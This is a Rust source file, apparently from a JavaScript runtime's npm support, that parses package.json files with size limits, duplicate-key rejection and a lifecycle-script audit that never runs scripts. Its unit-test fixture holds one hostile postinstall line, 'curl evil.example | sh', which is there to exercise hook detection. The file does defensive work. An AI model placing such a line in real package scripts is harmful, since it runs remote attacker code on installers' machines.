//! Bounded `package.json` parser for npm dependencies and project manifests.
//!
//! Preserves JSON object key insertion order in `"exports"` and `"imports"`
//! using [`indexmap::IndexMap`] (never alphabetizing condition keys), rejects
//! duplicate keys in parsed objects, detects lifecycle scripts for
//! [`ScriptAudit`] without ever executing them, and rejects non-empty
//! `bundledDependencies` / `bundleDependencies`.

use std::collections::{BTreeMap, BTreeSet};
use std::fmt;

use indexmap::IndexMap;
use neojs_module_policy::PackageType;
use serde::de::{self, Deserializer, MapAccess, SeqAccess, Visitor};
use serde::{Deserialize, Serialize};

use crate::specifier::PackageName;

/// Maximum byte size accepted for a `package.json` file (1 MiB).
pub const MAX_PACKAGE_JSON_BYTES: usize = 1024 * 1024;

/// Lifecycle hook names audited (and never executed) by `neojs-npm`.
pub const LIFECYCLE_SCRIPT_HOOKS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "preprepare",
    "prepare",
    "postprepare",
    "prepublish",
    "prepublishOnly",
    "preuninstall",
    "uninstall",
    "postuninstall",
];

/// Failure returned when parsing or validating a `package.json` document.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[non_exhaustive]
pub enum PackageJsonError {
    /// The `package.json` exceeded [`MAX_PACKAGE_JSON_BYTES`].
    #[error("package.json exceeds {MAX_PACKAGE_JSON_BYTES}-byte limit ({size} bytes)")]
    TooLarge { size: usize },

    /// JSON syntax, type, or duplicate-key validation failed.
    #[error("invalid package.json: {reason}")]
    InvalidJson { reason: String },

    /// The `"type"` field contained an unrecognized value.
    #[error("unsupported package.json \"type\": `{value}` (expected \"module\" or \"commonjs\")")]
    InvalidPackageType { value: String },

    /// Non-empty `bundledDependencies` / `bundleDependencies` are unsupported.
    #[error(
        "bundledDependencies / bundleDependencies are not supported because neojs does not materialize node_modules"
    )]
    BundledDependenciesNotSupported,
}

/// Ordered value tree for `package.json` `"exports"` and `"imports"` fields.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum ExportsField {
    /// Explicit `null` exclusion.
    Null,
    /// String target (`"./dist/index.mjs"` or bare external dependency).
    String(String),
    /// Fallback array of targets evaluated in order.
    Array(Vec<ExportsField>),
    /// Subpath or conditional map preserving exact JSON key insertion order.
    Object(IndexMap<String, ExportsField>),
}

impl<'de> Deserialize<'de> for ExportsField {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        struct ExportsVisitor;

        impl<'de> Visitor<'de> for ExportsVisitor {
            type Value = ExportsField;

            fn expecting(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
                f.write_str("null, a string, an array, or an object")
            }

            fn visit_unit<E>(self) -> Result<Self::Value, E> {
                Ok(ExportsField::Null)
            }

            fn visit_str<E>(self, v: &str) -> Result<Self::Value, E> {
                Ok(ExportsField::String(v.to_owned()))
            }

            fn visit_string<E>(self, v: String) -> Result<Self::Value, E> {
                Ok(ExportsField::String(v))
            }

            fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>
            where
                A: SeqAccess<'de>,
            {
                let mut items = Vec::new();
                while let Some(item) = seq.next_element()? {
                    items.push(item);
                }
                Ok(ExportsField::Array(items))
            }

            fn visit_map<A>(self, mut map: A) -> Result<Self::Value, A::Error>
            where
                A: MapAccess<'de>,
            {
                let mut out = IndexMap::new();
                while let Some(key) = map.next_key::<String>()? {
                    if out.contains_key(&key) {
                        return Err(de::Error::custom(format!(
                            "duplicate key `{key}` in exports/imports"
                        )));
                    }
                    let value = map.next_value()?;
                    out.insert(key, value);
                }
                Ok(ExportsField::Object(out))
            }
        }

        deserializer.deserialize_any(ExportsVisitor)
    }
}

/// Entry in `package.json` `"peerDependenciesMeta"`.
#[derive(Clone, Debug, Default, PartialEq, Eq, Deserialize, Serialize)]
#[serde(default)]
pub struct PeerDependencyMeta {
    /// Whether the peer dependency is optional when absent from the graph.
    pub optional: bool,
}

/// Lifecycle script and native binary audit metadata for one resolved package.
///
/// Lifecycle scripts are NEVER executed in Phases 1–2; this record surfaces
/// skipped hooks and excluded native binaries for diagnostics and `neo.lock`.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct ScriptAudit {
    /// Package name.
    pub package_name: String,
    /// Package version.
    pub version: String,
    /// Sorted list of ignored lifecycle script names found in `package.json` `"scripts"`.
    pub ignored_scripts: Vec<String>,
    /// Whether `gypfile: true` or `binding.gyp` was detected.
    pub has_gypfile: bool,
    /// Native binary paths excluded during tarball ingestion (`.node`, `.dll`, `.so`, `.dylib`).
    pub skipped_native_binaries: Vec<String>,
}

/// Target operating system, CPU architecture, and C library used for npm
/// `os` / `cpu` / `libc` filtering.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct TargetPlatform {
    /// npm OS identifier (`"linux"`, `"darwin"`, `"win32"`, etc.).
    pub os: String,
    /// npm CPU identifier (`"x64"`, `"arm64"`, `"ia32"`, `"arm"`, etc.).
    pub cpu: String,
    /// npm libc identifier (`"glibc"`, `"musl"`, or `None` outside Linux).
    pub libc: Option<String>,
}

impl TargetPlatform {
    /// Returns the host platform mapped to npm's `os`/`cpu`/`libc` vocabulary.
    pub fn current() -> Self {
        let os = match std::env::consts::OS {
            "macos" => "darwin",
            "windows" => "win32",
            other => other,
        };
        let cpu = match std::env::consts::ARCH {
            "x86_64" => "x64",
            "aarch64" => "arm64",
            "x86" => "ia32",
            other => other,
        };
        let libc = if cfg!(target_os = "linux") {
            if cfg!(target_env = "musl") {
                Some("musl".to_owned())
            } else {
                Some("glibc".to_owned())
            }
        } else {
            None
        };
        Self {
            os: os.to_owned(),
            cpu: cpu.to_owned(),
            libc,
        }
    }

    /// Returns `true` if a package declaring optional `os`, `cpu`, and `libc`
    /// constraints is compatible with this platform.
    pub fn matches(
        &self,
        os: Option<&[String]>,
        cpu: Option<&[String]>,
        libc: Option<&[String]>,
    ) -> bool {
        matches_filter(os, Some(&self.os))
            && matches_filter(cpu, Some(&self.cpu))
            && matches_filter(libc, self.libc.as_deref())
    }
}

fn matches_filter(constraints: Option<&[String]>, actual: Option<&str>) -> bool {
    let Some(list) = constraints else {
        return true;
    };
    if list.is_empty() {
        return true;
    }
    let Some(actual) = actual else {
        // Only negated constraints? If positive constraints exist and we have no
        // actual value (e.g. `libc` on non-Linux), positive constraint fails.
        return !list.iter().any(|entry| !entry.starts_with('!'));
    };
    let mut has_positive = false;
    let mut matched_positive = false;
    for entry in list {
        if let Some(neg) = entry.strip_prefix('!') {
            if neg == actual {
                return false;
            }
        } else {
            has_positive = true;
            if entry == actual {
                matched_positive = true;
            }
        }
    }
    !has_positive || matched_positive
}

/// Parsed, bounded representation of a dependency or project `package.json`.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PackageJson {
    /// Package `"name"`, when declared.
    pub name: Option<String>,
    /// Package `"version"`, when declared.
    pub version: Option<String>,
    /// Nearest `"type"` classification (`Module`, `CommonJs`, or `Unspecified`).
    pub package_type: PackageType,
    /// `"exports"` field preserving JSON key insertion order.
    pub exports: Option<ExportsField>,
    /// `"imports"` field (`#...`) preserving JSON key insertion order.
    pub imports: Option<IndexMap<String, ExportsField>>,
    /// `"main"` fallback path.
    pub main: Option<String>,
    /// `"dependencies"` map.
    pub dependencies: BTreeMap<String, String>,
    /// `"optionalDependencies"` map.
    pub optional_dependencies: BTreeMap<String, String>,
    /// `"peerDependencies"` map.
    pub peer_dependencies: BTreeMap<String, String>,
    /// `"peerDependenciesMeta"` map.
    pub peer_dependencies_meta: BTreeMap<String, PeerDependencyMeta>,
    /// Supported operating systems.
    pub os: Option<Vec<String>>,
    /// Supported CPU architectures.
    pub cpu: Option<Vec<String>>,
    /// Supported C libraries.
    pub libc: Option<Vec<String>>,
    /// Declared `"scripts"` (inspected for [`ScriptAudit`] only, never executed).
    pub scripts: BTreeMap<String, String>,
    /// Whether `"gypfile": true` is set.
    pub gypfile: bool,
}

impl PackageJson {
    /// Parses a `package.json` document from raw bytes bounded by [`MAX_PACKAGE_JSON_BYTES`].
    pub fn parse_bytes(bytes: &[u8]) -> Result<Self, PackageJsonError> {
        if bytes.len() > MAX_PACKAGE_JSON_BYTES {
            return Err(PackageJsonError::TooLarge { size: bytes.len() });
        }
        let text = std::str::from_utf8(bytes).map_err(|err| PackageJsonError::InvalidJson {
            reason: format!("invalid UTF-8: {err}"),
        })?;
        Self::parse_str(text)
    }

    /// Parses a `package.json` document from a UTF-8 string bounded by [`MAX_PACKAGE_JSON_BYTES`].
    pub fn parse_str(text: &str) -> Result<Self, PackageJsonError> {
        if text.len() > MAX_PACKAGE_JSON_BYTES {
            return Err(PackageJsonError::TooLarge { size: text.len() });
        }
        let raw: RawPackageJson =
            serde_json::from_str(text).map_err(|err| PackageJsonError::InvalidJson {
                reason: err.to_string(),
            })?;

        if has_non_empty_bundled(&raw.bundled_dependencies)
            || has_non_empty_bundled(&raw.bundle_dependencies)
        {
            return Err(PackageJsonError::BundledDependenciesNotSupported);
        }

        let package_type = match raw.package_type.as_deref() {
            None => PackageType::Unspecified,
            Some("module") => PackageType::Module,
            Some("commonjs") => PackageType::CommonJs,
            Some(other) => {
                return Err(PackageJsonError::InvalidPackageType {
                    value: other.to_owned(),
                });
            }
        };

        Ok(Self {
            name: raw.name,
            version: raw.version,
            package_type,
            exports: raw.exports,
            imports: raw.imports,
            main: raw.main,
            dependencies: raw.dependencies,
            optional_dependencies: raw.optional_dependencies,
            peer_dependencies: raw.peer_dependencies,
            peer_dependencies_meta: raw.peer_dependencies_meta,
            os: raw.os,
            cpu: raw.cpu,
            libc: raw.libc,
            scripts: raw.scripts,
            gypfile: raw.gypfile.unwrap_or(false),
        })
    }

    /// Validates and returns the parsed [`PackageName`] when `"name"` is set.
    pub fn parsed_name(&self) -> Result<Option<PackageName>, PackageJsonError> {
        self.name
            .as_deref()
            .map(|n| {
                PackageName::parse(n).map_err(|err| PackageJsonError::InvalidJson {
                    reason: err.to_string(),
                })
            })
            .transpose()
    }

    /// Returns the sorted list of ignored lifecycle hooks present in `"scripts"`.
    pub fn ignored_lifecycle_scripts(&self) -> Vec<String> {
        let mut found: Vec<String> = LIFECYCLE_SCRIPT_HOOKS
            .iter()
            .filter(|hook| self.scripts.contains_key(**hook))
            .map(|hook| (*hook).to_owned())
            .collect();
        found.sort();
        found
    }

    /// Returns `true` if `name` is declared in `dependencies`, `optionalDependencies`,
    /// or `peerDependencies`.
    pub fn is_declared_dependency(&self, name: &str) -> bool {
        self.dependencies.contains_key(name)
            || self.optional_dependencies.contains_key(name)
            || self.peer_dependencies.contains_key(name)
    }

    /// Builds a [`ScriptAudit`] summarizing ignored lifecycle scripts and native exclusions.
    pub fn build_script_audit(
        &self,
        fallback_name: &str,
        fallback_version: &str,
        has_binding_gyp: bool,
        skipped_native_binaries: Vec<String>,
    ) -> ScriptAudit {
        ScriptAudit {
            package_name: self
                .name
                .clone()
                .unwrap_or_else(|| fallback_name.to_owned()),
            version: self
                .version
                .clone()
                .unwrap_or_else(|| fallback_version.to_owned()),
            ignored_scripts: self.ignored_lifecycle_scripts(),
            has_gypfile: self.gypfile || has_binding_gyp,
            skipped_native_binaries,
        }
    }
}

#[derive(Deserialize)]
#[serde(untagged)]
enum BundledDepsField {
    Bool(bool),
    List(Vec<String>),
}

fn has_non_empty_bundled(field: &Option<BundledDepsField>) -> bool {
    match field {
        None => false,
        Some(BundledDepsField::Bool(b)) => *b,
        Some(BundledDepsField::List(items)) => !items.is_empty(),
    }
}

#[derive(Default)]
struct RawPackageJson {
    name: Option<String>,
    version: Option<String>,
    package_type: Option<String>,
    exports: Option<ExportsField>,
    imports: Option<IndexMap<String, ExportsField>>,
    main: Option<String>,
    dependencies: BTreeMap<String, String>,
    optional_dependencies: BTreeMap<String, String>,
    peer_dependencies: BTreeMap<String, String>,
    peer_dependencies_meta: BTreeMap<String, PeerDependencyMeta>,
    os: Option<Vec<String>>,
    cpu: Option<Vec<String>>,
    libc: Option<Vec<String>>,
    scripts: BTreeMap<String, String>,
    gypfile: Option<bool>,
    bundled_dependencies: Option<BundledDepsField>,
    bundle_dependencies: Option<BundledDepsField>,
}

impl<'de> Deserialize<'de> for RawPackageJson {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        struct PkgVisitor;

        impl<'de> Visitor<'de> for PkgVisitor {
            type Value = RawPackageJson;

            fn expecting(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
                f.write_str("a package.json JSON object")
            }

            fn visit_map<A>(self, mut map: A) -> Result<Self::Value, A::Error>
            where
                A: MapAccess<'de>,
            {
                let mut seen = BTreeSet::new();
                let mut out = RawPackageJson::default();
                while let Some(key) = map.next_key::<String>()? {
                    if !seen.insert(key.clone()) {
                        return Err(de::Error::custom(format!(
                            "duplicate key `{key}` in package.json"
                        )));
                    }
                    match key.as_str() {
                        "name" => out.name = map.next_value()?,
                        "version" => out.version = map.next_value()?,
                        "type" => out.package_type = map.next_value()?,
                        "exports" => out.exports = map.next_value()?,
                        "imports" => {
                            out.imports = map.next_value::<Option<NoDupIndexMap>>()?.map(|m| m.0);
                        }
                        "main" => out.main = map.next_value()?,
                        "dependencies" => {
                            out.dependencies = map.next_value::<NoDupStringMap>()?.0;
                        }
                        "optionalDependencies" => {
                            out.optional_dependencies = map.next_value::<NoDupStringMap>()?.0;
                        }
                        "peerDependencies" => {
                            out.peer_dependencies = map.next_value::<NoDupStringMap>()?.0;
                        }
                        "peerDependenciesMeta" => {
                            out.peer_dependencies_meta = map.next_value::<NoDupPeerMetaMap>()?.0;
                        }
                        "os" => out.os = map.next_value()?,
                        "cpu" => out.cpu = map.next_value()?,
                        "libc" => out.libc = map.next_value()?,
                        "scripts" => {
                            out.scripts = map.next_value::<NoDupStringMap>()?.0;
                        }
                        "gypfile" => out.gypfile = map.next_value()?,
                        "bundledDependencies" => out.bundled_dependencies = map.next_value()?,
                        "bundleDependencies" => out.bundle_dependencies = map.next_value()?,
                        _ => {
                            let _ = map.next_value::<de::IgnoredAny>()?;
                        }
                    }
                }
                Ok(out)
            }
        }

        deserializer.deserialize_map(PkgVisitor)
    }
}

struct NoDupIndexMap(IndexMap<String, ExportsField>);

impl<'de> Deserialize<'de> for NoDupIndexMap {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = NoDupIndexMap;
            fn expecting(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
                f.write_str("an imports map object")
            }
            fn visit_map<A>(self, mut map: A) -> Result<Self::Value, A::Error>
            where
                A: MapAccess<'de>,
            {
                let mut out = IndexMap::new();
                while let Some(k) = map.next_key::<String>()? {
                    if out.contains_key(&k) {
                        return Err(de::Error::custom(format!("duplicate key `{k}` in imports")));
                    }
                    let v = map.next_value()?;
                    out.insert(k, v);
                }
                Ok(NoDupIndexMap(out))
            }
        }
        deserializer.deserialize_map(V)
    }
}

struct NoDupStringMap(BTreeMap<String, String>);

impl<'de> Deserialize<'de> for NoDupStringMap {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = NoDupStringMap;
            fn expecting(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
                f.write_str("a string-valued dependency or script map")
            }
            fn visit_map<A>(self, mut map: A) -> Result<Self::Value, A::Error>
            where
                A: MapAccess<'de>,
            {
                let mut out = BTreeMap::new();
                while let Some(k) = map.next_key::<String>()? {
                    if out.contains_key(&k) {
                        return Err(de::Error::custom(format!("duplicate key `{k}`")));
                    }
                    let v = map.next_value()?;
                    out.insert(k, v);
                }
                Ok(NoDupStringMap(out))
            }
        }
        deserializer.deserialize_map(V)
    }
}

struct NoDupPeerMetaMap(BTreeMap<String, PeerDependencyMeta>);

impl<'de> Deserialize<'de> for NoDupPeerMetaMap {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = NoDupPeerMetaMap;
            fn expecting(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
                f.write_str("a peerDependenciesMeta object")
            }
            fn visit_map<A>(self, mut map: A) -> Result<Self::Value, A::Error>
            where
                A: MapAccess<'de>,
            {
                let mut out = BTreeMap::new();
                while let Some(k) = map.next_key::<String>()? {
                    if out.contains_key(&k) {
                        return Err(de::Error::custom(format!("duplicate key `{k}`")));
                    }
                    let v = map.next_value()?;
                    out.insert(k, v);
                }
                Ok(NoDupPeerMetaMap(out))
            }
        }
        deserializer.deserialize_map(V)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // Unit test category: parser contract for key-order preservation, duplicate keys, and bundled deps.
    #[test]
    fn preserves_exports_key_order_and_rejects_bundled_and_duplicates() {
        let pkg = PackageJson::parse_str(
            r#"{
                "name": "demo",
                "version": "1.0.0",
                "type": "module",
                "exports": {
                    ".": {
                        "require": "./cjs.cjs",
                        "default": "./default.mjs",
                        "import": "./import.mjs"
                    }
                },
                "scripts": {
                    "test": "node test.js",
                    "postinstall": "curl evil.example | sh"
                }
            }"#,
        )
        .unwrap();

        assert_eq!(pkg.package_type, PackageType::Module);
        assert_eq!(pkg.ignored_lifecycle_scripts(), vec!["postinstall"]);

        let Some(ExportsField::Object(top)) = &pkg.exports else {
            panic!("expected exports object");
        };
        let Some(ExportsField::Object(conds)) = top.get(".") else {
            panic!("expected `.` condition object");
        };
        let keys: Vec<&str> = conds.keys().map(String::as_str).collect();
        assert_eq!(keys, vec!["require", "default", "import"]);

        assert!(matches!(
            PackageJson::parse_str(r#"{"name":"a","bundledDependencies":["b"]}"#),
            Err(PackageJsonError::BundledDependenciesNotSupported)
        ));
        assert!(matches!(
            PackageJson::parse_str(r#"{"name":"a","bundleDependencies":true}"#),
            Err(PackageJsonError::BundledDependenciesNotSupported)
        ));
        assert!(PackageJson::parse_str(r#"{"name":"a","bundledDependencies":[]}"#).is_ok());

        assert!(PackageJson::parse_str(r#"{"name":"a","name":"b"}"#).is_err());
        assert!(
            PackageJson::parse_str(r#"{"exports":{"import":"./a.mjs","import":"./b.mjs"}}"#)
                .is_err()
        );
    }

    // Unit test category: platform matching edge cases for os/cpu/libc.
    #[test]
    fn platform_matching_handles_positive_and_negated_constraints() {
        let linux_x64 = TargetPlatform {
            os: "linux".to_owned(),
            cpu: "x64".to_owned(),
            libc: Some("glibc".to_owned()),
        };
        assert!(linux_x64.matches(
            Some(&["linux".to_owned(), "darwin".to_owned()]),
            Some(&["!arm64".to_owned()]),
            Some(&["glibc".to_owned()]),
        ));
        assert!(!linux_x64.matches(Some(&["!linux".to_owned()]), None, None));
        assert!(!linux_x64.matches(None, None, Some(&["musl".to_owned()])));
    }
}
